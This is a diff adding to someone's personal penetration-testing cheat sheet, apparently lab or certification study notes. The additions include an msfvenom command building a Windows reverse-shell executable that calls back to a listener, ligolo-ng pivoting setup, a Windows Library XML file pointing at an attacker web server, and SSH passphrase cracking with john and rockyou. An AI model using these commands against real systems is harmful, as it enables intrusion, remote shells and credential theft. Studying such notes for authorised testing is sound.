@@ -1,4 +1,5 @@
 # Tools
+___!!MAKE SURE TO HAVE ENOUGH RESOURCES..!!___
 ## curl
 `curl`
 - `-H "host: test.com"` add header, for testing vhosts\
@@ -20,5 +21,56 @@ Swiss Army Knife for SMTP\
 - `server` for server mode
 Note: issues with starting chisel client when using the pre-compiled version from Kali. Dowloaded release from github does work.\
 
-##
+## ExploitDB
 `searchsploit -m XXXXX ` to "mirror" a vulnerability from ExploitDB
+
+## msfvenom
+`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.186 LPORT=1337 -f exe > rev.exe ` Create windows reverse shell executable
+
+##ligolo-ng
+releases for proxy and agent on Github: https://github.com/nicocha30/ligolo-ng
+Start proxy:
+`sudo ip tuntap add user kali mode tun ligolo`
+`sudo ip link set ligolo up`
+
+`./proxy -selfcert`
+
+Start ligolo agent:
+`.\ligolo-agent.exe -connect xxx.xxx.xxx.xxx:11601 -ignore-cert`
+
+Setup tunnel over proxy:
+`session` Select session
+`ifconfig` -- Show ip info
+`sudo ip route add 192.168.0.0/24 dev ligolo` Create route
+`start` Start tunnel
+
+--Network is now reachable through proxy--
+
+## Other usefull resources:
+https://crackstation.net/
+
+
+## WIndows Library file exploit
+**NOTE:** After executing windows **optimizes the file** which could make it **unusable** on another machine.
+```xml
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.177</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+```
+
+## Cracking SSH keyphrase
+ssh2john sample.key > sample.hash
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
